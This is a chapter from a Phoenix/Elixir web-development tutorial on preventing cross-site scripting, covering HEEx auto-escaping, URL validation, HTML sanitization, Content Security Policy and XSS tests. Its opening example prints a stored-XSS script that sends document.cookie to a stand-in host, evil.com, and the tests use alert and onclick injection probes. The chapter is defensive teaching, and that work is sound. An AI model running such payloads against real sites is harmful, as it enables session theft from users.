# Chapter 10.4: XSS Prevention

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts. In this chapter, we'll explore how Phoenix prevents XSS and best practices for safe output.

## Understanding XSS

### The Attack

```html
<!-- Attacker submits comment with script -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>

<!-- If rendered without escaping -->
<div class="comment">
  <script>
    fetch('https://evil.com/steal?cookie=' + document.cookie)
  </script>
</div>

<!-- Script executes, stealing user's session -->
```

### Types of XSS

| Type | Description | Example |
|------|-------------|---------|
| Stored | Saved in database, served to users | Comment with script |
| Reflected | URL parameter reflected in page | Search query in results |
| DOM-based | Client-side JS manipulation | URL hash manipulation |

## Phoenix XSS Protection

### Automatic Escaping

HEEx templates automatically escape all output:

```heex
<%# User input is automatically escaped %>
<p><%= @user_input %></p>

<%# If user_input is "<script>alert('xss')</script>" %>
<%# Renders as: %>
<p>&lt;script&gt;alert('xss')&lt;/script&gt;</p>
```

### How It Works

```elixir
# Phoenix.HTML.html_escape/1
iex> Phoenix.HTML.html_escape("<script>alert('xss')</script>")
{:safe, "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;"}

# Characters escaped:
# < → &lt;
# > → &gt;
# & → &amp;
# " → &quot;
# ' → &#39;
```

### Safe vs Unsafe Content

```heex
<%# Safe - automatically escaped %>
<p><%= @user_comment %></p>

<%# DANGEROUS - raw output, no escaping %>
<p><%= raw(@user_comment) %></p>
<p><%= Phoenix.HTML.raw(@user_comment) %></p>
```

## Contexts and Escaping

### HTML Context

```heex
<%# Properly escaped for HTML context %>
<p><%= @name %></p>
<div class="user"><%= @bio %></div>
```

### Attribute Context

```heex
<%# Attributes are also escaped %>
<input value={@user_input}>
<a href={@url}>Link</a>

<%# Phoenix escapes quotes in attributes %>
<%# If @user_input is: " onclick="alert('xss') %>
<%# Renders as: value="&quot; onclick=&quot;alert('xss')" %>
```

### JavaScript Context

```heex
<%# DANGEROUS - injecting into JavaScript %>
<script>
  var userData = '<%= @user_data %>';  // NOT SAFE!
</script>

<%# Safe - use JSON encoding %>
<script>
  var userData = <%= raw(Jason.encode!(@user_data)) %>;
</script>

<%# Better - use data attributes %>
<div id="user-data" data-user={Jason.encode!(@user)}>
</div>
<script>
  var userData = JSON.parse(document.getElementById('user-data').dataset.user);
</script>
```

### URL Context

```heex
<%# Validate URL schemes %>
<a href={@user_url}>Link</a>

<%# Attacker could submit: javascript:alert('xss') %>
<%# Validate in controller/context: %>
```

```elixir
def validate_url(url) do
  uri = URI.parse(url)

  if uri.scheme in ["http", "https"] do
    {:ok, url}
  else
    {:error, :invalid_scheme}
  end
end
```

## Safe HTML Rendering

### When You Need HTML

Sometimes you need to render user-provided HTML (e.g., rich text editors):

```elixir
# Add dependency
{:html_sanitize_ex, "~> 1.4"}
```

### Sanitization

```elixir
# File: lib/snippetbox/sanitizer.ex

defmodule Snippetbox.Sanitizer do
  @moduledoc """
  HTML sanitization for user content.
  """

  @doc """
  Basic HTML - allows formatting tags only.
  """
  def basic_html(html) do
    HtmlSanitizeEx.basic_html(html)
  end

  @doc """
  Markdown HTML - allows more tags for rendered markdown.
  """
  def markdown_html(html) do
    HtmlSanitizeEx.markdown_html(html)
  end

  @doc """
  Strip all HTML tags.
  """
  def strip_tags(html) do
    HtmlSanitizeEx.strip_tags(html)
  end

  @doc """
  Custom sanitization with specific allowed tags.
  """
  def custom_html(html) do
    HtmlSanitizeEx.Scrubber.scrub(html, CustomScrubber)
  end
end

# Custom scrubber
defmodule Snippetbox.Sanitizer.CustomScrubber do
  require HtmlSanitizeEx.Scrubber.Meta
  alias HtmlSanitizeEx.Scrubber.Meta

  # Allow specific tags
  Meta.allow_tag_with_uri_attributes("a", ["href"], ["http", "https"])
  Meta.allow_tag_with_these_attributes("a", ["title"])
  Meta.allow_tag_with_these_attributes("p", [])
  Meta.allow_tag_with_these_attributes("br", [])
  Meta.allow_tag_with_these_attributes("strong", [])
  Meta.allow_tag_with_these_attributes("em", [])
  Meta.allow_tag_with_these_attributes("code", ["class"])
  Meta.allow_tag_with_these_attributes("pre", ["class"])

  # Strip everything else
  Meta.strip_everything_not_covered()
end
```

### Using Sanitized HTML

```elixir
# In changeset
def changeset(comment, attrs) do
  comment
  |> cast(attrs, [:content])
  |> sanitize_content()
end

defp sanitize_content(changeset) do
  case get_change(changeset, :content) do
    nil -> changeset
    content ->
      sanitized = Snippetbox.Sanitizer.basic_html(content)
      put_change(changeset, :content, sanitized)
  end
end
```

```heex
<%# Now safe to render as raw %>
<div class="comment">
  <%= raw(@comment.content) %>
</div>
```

## Content Security Policy

### Preventing Inline Scripts

CSP blocks XSS even if other defenses fail:

```elixir
# File: lib/snippetbox_web/plugs/csp.ex

defmodule SnippetboxWeb.Plugs.CSP do
  import Plug.Conn

  def init(opts), do: opts

  def call(conn, _opts) do
    put_resp_header(conn, "content-security-policy", csp_policy())
  end

  defp csp_policy do
    [
      "default-src 'self'",
      "script-src 'self'",           # No inline scripts
      "style-src 'self' 'unsafe-inline'",  # Allow inline styles
      "img-src 'self' data: https:",
      "font-src 'self'",
      "connect-src 'self' wss:",
      "frame-ancestors 'none'"
    ]
    |> Enum.join("; ")
  end
end
```

### With Nonces for Inline Scripts

```elixir
defmodule SnippetboxWeb.Plugs.CSPNonce do
  import Plug.Conn

  def init(opts), do: opts

  def call(conn, _opts) do
    nonce = generate_nonce()

    conn
    |> assign(:csp_nonce, nonce)
    |> put_resp_header("content-security-policy", csp_policy(nonce))
  end

  defp generate_nonce do
    :crypto.strong_rand_bytes(16) |> Base.encode64()
  end

  defp csp_policy(nonce) do
    "default-src 'self'; script-src 'self' 'nonce-#{nonce}'"
  end
end
```

```heex
<%# Use nonce for inline scripts %>
<script nonce={@csp_nonce}>
  // This script will execute
</script>

<script>
  // This will be blocked by CSP
</script>
```

## Common XSS Vectors

### User-Generated Links

```elixir
# Validate URLs before storing
def changeset(profile, attrs) do
  profile
  |> cast(attrs, [:website])
  |> validate_url(:website)
end

defp validate_url(changeset, field) do
  validate_change(changeset, field, fn _, url ->
    case URI.parse(url) do
      %URI{scheme: scheme} when scheme in ["http", "https"] -> []
      _ -> [{field, "must be a valid http(s) URL"}]
    end
  end)
end
```

### JSON Data in Templates

```heex
<%# Safe JSON embedding %>
<script type="application/json" id="initial-data">
  <%= raw(Jason.encode!(@data)) %>
</script>

<%# In JavaScript %>
<script>
  const data = JSON.parse(document.getElementById('initial-data').textContent);
</script>
```

### SVG Files

```elixir
# SVG can contain JavaScript
# Sanitize or serve with content-type restrictions

def serve_upload(conn, %{"filename" => filename}) do
  path = upload_path(filename)

  # Force download for dangerous types
  if dangerous_file_type?(filename) do
    send_download(conn, {:file, path}, filename: filename)
  else
    send_file(conn, 200, path)
  end
end

defp dangerous_file_type?(filename) do
  ext = Path.extname(filename) |> String.downcase()
  ext in [".svg", ".html", ".htm", ".xml"]
end
```

## Testing for XSS

### Controller Tests

```elixir
# File: test/snippetbox_web/controllers/snippet_controller_test.exs

describe "XSS prevention" do
  test "escapes script tags in title", %{conn: conn} do
    {:ok, snippet} = Snippets.create_snippet(%{
      title: "<script>alert('xss')</script>",
      content: "test"
    })

    conn = get(conn, ~p"/snippets/#{snippet}")
    html = html_response(conn, 200)

    # Script should be escaped, not rendered
    refute html =~ "<script>alert"
    assert html =~ "&lt;script&gt;"
  end

  test "escapes event handlers in attributes", %{conn: conn} do
    {:ok, snippet} = Snippets.create_snippet(%{
      title: ~s(" onclick="alert('xss')),
      content: "test"
    })

    conn = get(conn, ~p"/snippets/#{snippet}")
    html = html_response(conn, 200)

    refute html =~ ~s(onclick="alert)
  end
end
```

### Security Headers Test

```elixir
test "includes CSP header", %{conn: conn} do
  conn = get(conn, ~p"/")

  csp = get_resp_header(conn, "content-security-policy") |> List.first()

  assert csp =~ "default-src"
  assert csp =~ "script-src"
end
```

## XSS Checklist

- [ ] All output uses HEEx templates (auto-escaped)
- [ ] `raw/1` only used with sanitized content
- [ ] URLs validated for safe schemes
- [ ] JSON embedded safely
- [ ] CSP headers configured
- [ ] File uploads properly handled
- [ ] User HTML sanitized before storage
- [ ] No dynamic JavaScript generation with user input

> **FP Concept: Output Encoding by Default**
>
> Phoenix follows the principle of safe defaults:
>
> ```elixir
> # Safe by default - must explicitly opt out
> <%= @user_input %>  # Escaped
>
> # Explicit unsafe operation
> <%= raw(@sanitized_html) %>  # Developer acknowledges risk
> ```
>
> This makes security the path of least resistance.

## Summary

In this chapter, we learned:

- How XSS attacks work
- Phoenix's automatic output escaping
- Different contexts requiring different handling
- HTML sanitization for rich content
- Content Security Policy
- Common XSS vectors and mitigations
- Testing for XSS vulnerabilities

In the next chapter, we'll explore security headers.
